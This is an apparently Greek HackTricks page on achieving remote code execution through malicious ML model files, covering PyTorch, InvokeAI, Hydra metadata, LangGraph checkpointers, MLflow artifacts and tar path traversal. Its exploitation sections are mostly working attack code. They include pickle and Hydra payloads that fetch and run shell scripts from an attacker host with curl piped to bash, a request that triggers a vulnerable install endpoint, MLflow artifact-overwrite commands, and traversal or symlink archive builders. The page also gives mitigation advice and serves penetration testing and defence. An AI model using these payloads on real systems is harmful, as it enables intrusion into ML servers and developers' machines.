# Μοντέλα RCE

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση μοντέλων για RCE

Τα μοντέλα Machine Learning συνήθως διαμοιράζονται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch κ.λπ. Οι προγραμματιστές μπορούν να τα φορτώσουν στους υπολογιστές τους ή σε συστήματα παραγωγής για να τα χρησιμοποιήσουν. Συνήθως τα μοντέλα δεν θα πρέπει να περιέχουν κακόβουλο κώδικα, αλλά υπάρχουν περιπτώσεις όπου ένα μοντέλο μπορεί να χρησιμοποιηθεί για την εκτέλεση αυθαίρετου κώδικα στο σύστημα είτε ως προβλεπόμενη λειτουργία είτε λόγω ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Ο ακόλουθος πίνακας παραθέτει αντιπροσωπευτικές ευπάθειες αυτής της κατηγορίας:

| **Framework / Εργαλείο**        | **Ευπάθεια (CVE, αν υπάρχει)**                                                    | **Διάνυσμα RCE**                                                                                                                           | **Αναφορές**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Μη ασφαλής αποσειριοποίηση στο* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle στο checkpoint του μοντέλου οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας την προστασία `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | Το SSRF σε συνδυασμό με τη λήψη κακόβουλου μοντέλου προκαλεί εκτέλεση κώδικα· RCE μέσω αποσειριοποίησης Java στο management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Μη ασφαλής αποσειριοποίηση checkpoint μέσω `torch.load` **(CVE-2025-23298)**                                           | Μη έμπιστο checkpoint ενεργοποιεί pickle reducer κατά την εκτέλεση της `load_model_trainer_states_from_checkpoint` → εκτέλεση κώδικα στο ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + μη ασφαλές hook επέκτασης MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Το κλειδί `filter` που ελέγχεται από τον χρήστη εισάγει σύνταξη SQL/JSON-path, το `UNION SELECT` δημιουργεί μια πλαστή εγγραφή checkpoint και στη συνέχεια η αποσειριοποίηση `msgpack` εισάγει και καλεί κώδικα Python που επιλέγει ο επιτιθέμενος | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (μη ασφαλές YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Η φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Η φόρτωση μοντέλου με επίπεδο **Lambda** εκτελεί αυθαίρετο κώδικα Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (ανάλυση TFLite)                                                                                          | Ένα ειδικά διαμορφωμένο μοντέλο `.tflite` προκαλεί υπερχείλιση ακέραιου → καταστροφή heap (πιθανό RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Η φόρτωση μοντέλου μέσω `joblib.load` εκτελεί pickle με payload `__reduce__` του επιτιθέμενου                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (μη ασφαλές `np.load`) *αμφισβητείται*                                                                              | Η προεπιλεγμένη συμπεριφορά του `numpy.load` επέτρεπε πίνακες αντικειμένων με pickle – κακόβουλο `.npy/.npz` προκαλεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Η διαδρομή των εξωτερικών βαρών του μοντέλου ONNX μπορεί να διαφύγει από τον κατάλογο (ανάγνωση αυθαίρετων αρχείων) <br> Κακόβουλο tar μοντέλου ONNX μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (κίνδυνος σχεδιασμού)  | *(Χωρίς CVE)* Προσαρμοσμένοι τελεστές ONNX / control flow                                                                                    | Μοντέλο με προσαρμοσμένο τελεστή απαιτεί τη φόρτωση εγγενούς κώδικα του επιτιθέμενου· σύνθετα γραφήματα μοντέλων καταχρώνται τη λογική για την εκτέλεση ακούσιων υπολογισμών   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του API φόρτωσης μοντέλων με ενεργοποιημένο το `--model-control` επιτρέπει σχετική διαδρομή traversal για εγγραφή αρχείων (π.χ. αντικατάσταση του `.bashrc` για RCE)    | |
| **GGML (μορφή GGUF)**      | **CVE-2024-25664 … 25668** (πολλαπλές υπερχειλίσεις heap)                                                                         | Κακοσχηματισμένο αρχείο μοντέλου GGUF προκαλεί υπερχειλίσεις heap buffer στον parser, επιτρέποντας την εκτέλεση αυθαίρετου κώδικα στο σύστημα του θύματος                     | |
| **Keras (παλαιότερες μορφές)**   | *(Χωρίς νέα CVE)* Παλαιό μοντέλο Keras H5                                                                                         | Κακόβουλο μοντέλο HDF5 (`.h5`) με επίπεδο Lambda εξακολουθεί να εκτελεί κώδικα κατά τη φόρτωση (το Keras safe_mode δεν καλύπτει την παλιά μορφή – «downgrade attack») | |
| **Άλλα** (γενικά)        | *Σφάλμα σχεδιασμού* – Σειριοποίηση Pickle                                                                                         | Πολλά εργαλεία ML (π.χ. μορφές μοντέλων που βασίζονται σε pickle, Python `pickle.load`) εκτελούν αυθαίρετο κώδικα ενσωματωμένο σε αρχεία μοντέλων, εκτός αν ληφθούν μέτρα προστασίας | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Μη έμπιστα metadata που περνούν στο `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/config μοντέλου που ελέγχεται από τον επιτιθέμενο ορίζει το `_target_` σε αυθαίρετη callable (π.χ. `builtins.exec`) → εκτελείται κατά τη φόρτωση, ακόμη και με «ασφαλείς» μορφές (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Επιπλέον, υπάρχουν μοντέλα που βασίζονται στο Python pickle, όπως αυτά που χρησιμοποιούνται από το [PyTorch](https://github.com/pytorch/pytorch/security), τα οποία μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα, αν δεν φορτωθούν με `weights_only=True`. Επομένως, κάθε μοντέλο που βασίζεται σε pickle ενδέχεται να είναι ιδιαίτερα ευάλωτο σε αυτού του τύπου τις επιθέσεις, ακόμη κι αν δεν αναφέρεται στον παραπάνω πίνακα.

### Metadata Hydra → RCE (λειτουργεί ακόμη και με safetensors)

Η `hydra.utils.instantiate()` εισάγει και καλεί οποιοδήποτε dotted `_target_` σε ένα αντικείμενο configuration/metadata. Όταν βιβλιοθήκες όπως το Hugging Face Transformers περνούν **μη έμπιστα metadata μοντέλου** στο `instantiate()`, ένας επιτιθέμενος μπορεί να ορίσει ένα callable και ορίσματα που εκτελούνται αμέσως κατά τη φόρτωση του μοντέλου (δεν απαιτείται pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Παράδειγμα payload (λειτουργεί σε `model_config.yaml` του `.nemo`, στο `config.json` του repo ή μέσα στο `__metadata__` του `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Βασικά σημεία:
- Ενεργοποιείται πριν από την αρχικοποίηση του μοντέλου στα `restore_from/from_pretrained` του NeMo, στους HuggingFace coders του uni2TS και στους loaders του FlexTok.
- Η string block-list του Hydra μπορεί να παρακαμφθεί μέσω εναλλακτικών διαδρομών εισαγωγής (π.χ. `enum.bltns.eval`) ή ονομάτων που επιλύονται από την εφαρμογή (π.χ. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- Το FlexTok αναλύει επίσης μεταδεδομένα σε μορφή συμβολοσειράς με `ast.literal_eval`, επιτρέποντας DoS (υπερβολική κατανάλωση CPU/μνήμης) πριν από την κλήση του Hydra.

### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)

Το `InvokeAI` είναι ένα δημοφιλές web interface ανοικτού κώδικα για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install`, το οποίο επιτρέπει στους χρήστες να κάνουν download και load μοντέλα από αυθαίρετα URLs.<sup>[[1]](#references)</sup>

Εσωτερικά, το endpoint τελικά καλεί:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Όταν το παρεχόμενο αρχείο είναι **checkpoint του PyTorch (`*.ckpt`)**, η `torch.load` εκτελεί **αποσειριοποίηση pickle**. Επειδή το περιεχόμενο προέρχεται απευθείας από URL που ελέγχει ο χρήστης, ένας attacker μπορεί να ενσωματώσει ένα κακόβουλο object με custom μέθοδο `__reduce__` μέσα στο checkpoint· η μέθοδος εκτελείται **κατά την αποσειριοποίηση**, οδηγώντας σε **remote code execution (RCE)** στον server του InvokeAI.

Στην ευπάθεια αποδόθηκε το **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Βήμα προς βήμα εκμετάλλευση

1. Δημιουργήστε ένα κακόβουλο checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Ενεργοποιήστε το ευάλωτο endpoint (δεν απαιτείται authentication):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Όταν το InvokeAI κατεβάζει το αρχείο, καλεί τη `torch.load()` → εκτελείται το gadget `os.system` και ο attacker αποκτά εκτέλεση κώδικα στο πλαίσιο της διεργασίας InvokeAI.

Έτοιμο exploit: το module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη διαδικασία.<sup>[[3]](#references)</sup>

#### Προϋποθέσεις

•  InvokeAI 5.3.1-5.4.2 (η προεπιλεγμένη τιμή της σημαίας `scan` είναι **false**)  
•  Το `/api/v2/models/install` είναι προσβάσιμο από τον attacker  
•  Η διεργασία έχει δικαιώματα εκτέλεσης εντολών shell

#### Μετριασμός κινδύνου

* Αναβαθμίστε σε **InvokeAI ≥ 5.4.3** – η ενημέρωση κώδικα ορίζει `scan=True` από προεπιλογή και εκτελεί σάρωση για κακόβουλο λογισμικό πριν από την αποσειριοποίηση.<sup>[[2]](#references)</sup>
* Κατά τη φόρτωση checkpoints μέσω κώδικα, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή το νέο βοηθητικό `torch.load_safe` (https://pytorch.org/docs/stable/serialization.html#security).
* Επιβάλετε λίστες επιτρεπόμενων πηγών / υπογραφές για τα μοντέλα και εκτελέστε την υπηρεσία με τα ελάχιστα απαραίτητα προνόμια.

> ⚠️ Να θυμάστε ότι **κάθε** μορφότυπος που βασίζεται σε Python pickle (συμπεριλαμβανομένων πολλών αρχείων `.pt`, `.pkl`, `.ckpt`, `.pth`) είναι εγγενώς μη ασφαλής για αποσειριοποίηση από μη έμπιστες πηγές.

---

Παράδειγμα πρόχειρου μετριασμού κινδύνου, αν πρέπει να συνεχίσετε να εκτελείτε παλαιότερες εκδόσεις του InvokeAI πίσω από reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE στο NVIDIA Merlin Transformers4Rec μέσω μη ασφαλούς `torch.load` (CVE-2025-23298)

Το Transformers4Rec της NVIDIA (μέρος του Merlin) διέθετε έναν μη ασφαλή loader checkpoint, ο οποίος καλούσε απευθείας τη `torch.load()` σε διαδρομές που παρείχε ο χρήστης. Επειδή η `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint που ελέγχεται από εισβολέα μπορεί να εκτελέσει αυθαίρετο κώδικα μέσω ενός reducer κατά την αποσειριοποίηση.<sup>[[5]](#references)</sup>

Ευάλωτη διαδρομή (πριν από τη διόρθωση): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στο Python pickle, ένα αντικείμενο μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει μια callable συνάρτηση και ορίσματα. Η callable συνάρτηση εκτελείται κατά το unpickling. Αν υπάρχει τέτοιο αντικείμενο σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν τα βάρη.

Ελάχιστο παράδειγμα κακόβουλου checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Διαδρομές παράδοσης και ακτίνα επίδρασης:
- Trojanized checkpoints/models που κοινοποιούνται μέσω repos, buckets ή artifact registries
- Αυτοματοποιημένα pipelines resume/deploy που φορτώνουν αυτόματα checkpoints
- Η εκτέλεση γίνεται μέσα σε training/inference workers, συχνά με αυξημένα προνόμια (π.χ. root σε containers)

Διόρθωση: Το commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε την άμεση χρήση του `torch.load()` με έναν περιορισμένο deserializer, ο οποίος υλοποιείται στο `transformers4rec/utils/serialization.py` και χρησιμοποιεί allow-list. Ο νέος loader επικυρώνει τους τύπους και τα πεδία και εμποδίζει την εκτέλεση αυθαίρετων callables κατά τη φόρτωση.<sup>[[7]](#references)</sup>

Οδηγίες προστασίας ειδικά για PyTorch checkpoints:
- Μην κάνετε unpickle μη έμπιστων δεδομένων. Προτιμήστε μη εκτελέσιμες μορφές, όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX, όπου είναι δυνατό.
- Αν πρέπει να χρησιμοποιήσετε PyTorch serialization, βεβαιωθείτε ότι έχει οριστεί `weights_only=True` (υποστηρίζεται σε νεότερες εκδόσεις PyTorch) ή χρησιμοποιήστε custom allow-listed unpickler, παρόμοιο με το patch του Transformers4Rec.<sup>[[4]](#references)</sup>
- Επιβάλετε provenance/signatures για τα μοντέλα και απομονώστε τη διαδικασία deserialization σε sandbox (seccomp/AppArmor· χρήστης non-root· περιορισμένο FS και χωρίς εξερχόμενη κίνηση δικτύου).
- Παρακολουθείτε για απρόσμενες child processes από ML services κατά τη φόρτωση checkpoint· εντοπίστε τη χρήση των `torch.load()`/`pickle`.

POC και αναφορές σε ευπαθείς εκδόσεις/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Ευπαθής loader πριν από το patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC κακόβουλου checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader μετά το patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Παράδειγμα – δημιουργία κακόβουλου PyTorch model

- Δημιουργήστε το model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Φορτώστε το μοντέλο:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Αποσειριοποίηση Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το FaceDetection-DSFD της Tencent εκθέτει ένα endpoint `resnet` που αποσειριοποιεί δεδομένα ελεγχόμενα από τον χρήστη. Η ZDI επιβεβαίωσε ότι ένας απομακρυσμένος attacker μπορεί να εξαναγκάσει ένα θύμα να φορτώσει μια κακόβουλη σελίδα/αρχείο, να την κάνει να στείλει ένα ειδικά διαμορφωμένο serialized blob σε αυτό το endpoint και να προκαλέσει αποσειριοποίηση ως `root`, οδηγώντας σε πλήρη παραβίαση.

Η ροή του exploit μοιάζει με τη συνηθισμένη κατάχρηση του pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Οποιοδήποτε gadget είναι προσβάσιμο κατά το deserialization (constructors, `__setstate__`, callbacks του framework κ.λπ.) μπορεί να αξιοποιηθεί για επίθεση με τον ίδιο τρόπο, ανεξάρτητα από το αν το transport ήταν HTTP, WebSocket ή ένα αρχείο που αποθηκεύτηκε σε έναν κατάλογο που παρακολουθείται.



### LangGraph checkpointer SQLi → MessagePack RCE

Αυτή η αλυσίδα επίθεσης είναι ενδιαφέρουσα, επειδή ο attacker **δεν χρειάζεται να ανεβάσει κακόβουλο αρχείο μοντέλου**. Αντίθετα, η εφαρμογή εκθέτει ένα **API διατήρησης κατάστασης AI-agent** (`get_state_history(..., filter=...)`) και τα δεδομένα εισόδου του χρήστη καταλήγουν στο query builder του checkpointer.

#### 1. Δομική SQLi σε φίλτρα metadata

Ένα ευάλωτο μοτίβο SQLite έμοιαζε ως εξής:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Η τιμή δεσμεύεται αργότερα, αλλά το `query_key` συνενώνεται στη **συμβολοσειρά JSON path**, οπότε ένα `'` μέσα στο dictionary key διαφεύγει από το `'$.{query_key}'` και εισάγει SQL. Το ίδιο ισχύει για **JSON paths, identifiers, operators, `LIMIT` και πεδία TTL**: τα placeholders προστατεύουν μόνο τις τιμές, όχι τη δομική σύνταξη των queries.

#### 2. Το `UNION SELECT` μπορεί να στοχεύσει downstream sinks, όχι μόνο να υποκλέψει δεδομένα

Το query επιστρέφει τα `type` και serialized bytes του `checkpoint`, τα οποία στη συνέχεια καταναλώνονται ως εξής:

```python
self.serde.loads_typed((type, checkpoint))
```

Αυτό σημαίνει ότι μια SQLi στο τμήμα `WHERE` μπορεί να εισαγάγει μια **ψεύτικη γραμμή αποτελέσματος**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Αν μεταγενέστερος κώδικας αναλύει, αποσειριοποιεί, γράφει ή εκτελεί κάποια επιλεγμένη στήλη, αντιστοιχίστε αυτές τις στήλες με τα sinks τους. Σε αυτήν την περίπτωση, η πλαστή γραμμή μετατρέπει το SQLi σε **αποσειριοποίηση ελεγχόμενη από τον attacker**.

#### 3. Τα μη ασφαλή MessagePack extension hooks ισοδυναμούν με code gadgets

Η διαδρομή `msgpack` του LangGraph χρησιμοποιούσε ένα προσαρμοσμένο extension hook που αποσυσκεύαζε ένα ένθετο tuple και εκτελούσε:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Έτσι, ένα αντικείμενο επέκτασης MessagePack που κωδικοποιεί κάτι ισοδύναμο με `("os", "system", "id > /tmp/pwned")` εισάγει το `os`, εντοπίζει το `system` και εκτελεί την εντολή. Κατά τον έλεγχο frameworks AI, εξετάστε τους **custom revivers για MessagePack/JSON/pickle** για δυναμικές εισαγωγές, reflection ή αυθαίρετη κλήση callable.

#### 4. Πρακτικό μοτίβο ελέγχου για frameworks agent

Εξετάστε κάθε είσοδο που ελέγχεται από χρήστη και φτάνει σε:
- APIs καταχώρισης ιστορικού κατάστασης / μνήμης / replay / checkpoint
- builders δομημένων φίλτρων που δημιουργούν αποσπάσματα ερωτημάτων SQL ή Redis
- custom deserializers (`pickle`, `msgpack`, hooks αντικειμένων `json`, constructors YAML)
- διαδρομές ανάκτησης που εμπιστεύονται γραμμές οι οποίες επιστρέφονται από το persistence layer

Αυτή η συγκεκριμένη αλυσίδα επηρέαζε self-hosted εγκαταστάσεις LangGraph που χρησιμοποιούσαν checkpointers **SQLite** ή **Redis**, όταν μη έμπιστοι χρήστες μπορούσαν να ελέγχουν το `filter`. Οι patched εκδόσεις που αναφέρονταν στη γνωστοποίηση ήταν `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` και `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Αντικατάσταση artifact MLflow PyFunc που οδηγεί σε pickle RCE

Ένα MLflow PyFunc που δημιουργείται από `PythonModel` μπορεί να αποθηκεύσει το serialized αντικείμενο ως `python_model.pkl`. Τα metadata του model ορίζουν το `mlflow.pyfunc.model` ως loader του, ενώ η υλοποίηση του MLflow χρησιμοποιεί αυτό το filename για το αποθηκευμένο Python model. Κατά συνέπεια, η δυνατότητα εγγραφής στο artifact store μπορεί να οδηγήσει σε εκτέλεση κώδικα σε διαφορετική εφαρμογή που φορτώνει αργότερα το model.<sup>[[17]](#references)[[18]](#references)</sup>

Η χρήσιμη αλυσίδα είναι **δικαίωμα εγγραφής artifact → αντικατάσταση του pickle → εξαναγκασμός ενός consumer inference να το φορτώσει ξανά**. Για ένα experiment που χρησιμοποιεί proxied root `mlflow-artifacts:/...`, απαριθμήστε το experiment, το run και τη διαδρομή artifact του model. Ο tracking server εκθέτει τα `GET` και `PUT` στο `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Ένας minimal reducer μπορεί να εκτελέσει μια εντολή μόλις ο consumer κάνει unpickle το artifact. Η δημιουργία του payload με την έκδοση Python που δηλώνεται στο `MLmodel` αποφεύγει προβλήματα συμβατότητας.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Ενεργοποιήστε τη λειτουργία που **φορτώνει το υπάρχον μοντέλο**, όπως πρόβλεψη, βαθμολόγηση ή deployment. Μην κάνετε πρώτα retrain, επειδή η εκπαίδευση μπορεί να αντικαταστήσει το κακόβουλο artifact με ένα νέο μοντέλο. Ένα σφάλμα της εφαρμογής δεν αναιρεί την εκμετάλλευση: ο reducer επιστρέφει την ακέραια κατάσταση εξόδου της εντολής αντί για ένα αξιοποιήσιμο μοντέλο. Ξεκινήστε με μια παρατηρήσιμη παρενέργεια, όπως ICMP ή ένα HTTP callback, και μετά αντικαταστήστε την με το τελικό payload.<sup>[[20]](#references)</sup>

Κατά την αξιολόγηση, διακρίνετε την άδεια δημιουργίας ενός run από την άδεια αντικατάστασης artifacts που ανήκουν σε άλλο run. Ελέγξτε τον έλεγχο ταυτότητας και τα δικαιώματα ενημέρωσης ανά run, επιθεωρήστε τυχόν απρόσμενες τροποποιήσεις του `python_model.pkl` και αντιμετωπίστε την προέλευση και την ακεραιότητα του μοντέλου ως μέρος του ορίου εκτέλεσης. Ο τρέχων κώδικας του MLflow υποστηρίζει επίσης τη ρύθμιση `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` και συνιστά artifacts models-from-code αντί για φόρτωση δεδομένων cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Μοντέλα για Path Traversal

Όπως αναφέρεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), οι περισσότερες μορφές μοντέλων που χρησιμοποιούνται από διαφορετικά AI frameworks βασίζονται σε αρχεία αρχειοθέτησης, συνήθως `.zip`. Επομένως, ενδέχεται να είναι δυνατή η κατάχρηση αυτών των μορφών για επιθέσεις path traversal, ώστε να είναι δυνατή η ανάγνωση αυθαίρετων αρχείων από το σύστημα όπου φορτώνεται το μοντέλο.<sup>[[16]](#references)</sup>

Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` κατά τη φόρτωσή του:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργεί ένα symlink προς τον κατάλογο `/tmp` όταν φορτωθεί:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Εμβάθυνση: Keras .keras deserialization και gadget hunting

Για έναν εστιασμένο οδηγό σχετικά με τα εσωτερικά του .keras, το RCE μέσω Lambda-layer, το ζήτημα αυθαίρετου import στις εκδόσεις ≤ 3.8 και την αναζήτηση gadget μετά τη διόρθωση μέσα στην allowlist, δείτε:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Ιστολόγιο OffSec – "CVE-2024-12029 – Αποσειριοποίηση μη έμπιστων δεδομένων στο InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit διόρθωσης του InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Τεκμηρίωση της μονάδας Metasploit του Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – ζητήματα ασφάλειας για το torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Ιστολόγιο ZDI – CVE-2025-23298: Επίτευξη απομακρυσμένης εκτέλεσης κώδικα στο NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Συμβουλευτικό δελτίο ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit διόρθωσης του Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ευπαθής loader πριν από τη διόρθωση (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC κακόβουλου checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader μετά τη διόρθωση (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers του Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Απομακρυσμένη εκτέλεση κώδικα με σύγχρονες μορφές και βιβλιοθήκες AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Τεκμηρίωση της Hydra για το instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit block-list της Hydra (προειδοποίηση για RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Από SQLi σε RCE: Εκμετάλλευση του checkpointer του LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Αξιοποίηση σφαλμάτων Archive Slip για την εξασφάλιση υψηλής αξίας bounty σε AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Συμβουλευτικό δελτίο Snyk και proof of concept για PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Πηγαίος κώδικας του MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API του MLflow – endpoints λήψης και μεταφόρτωσης artifacts](https://mlflow.org/docs/latest/api_reference/rest-api.html)
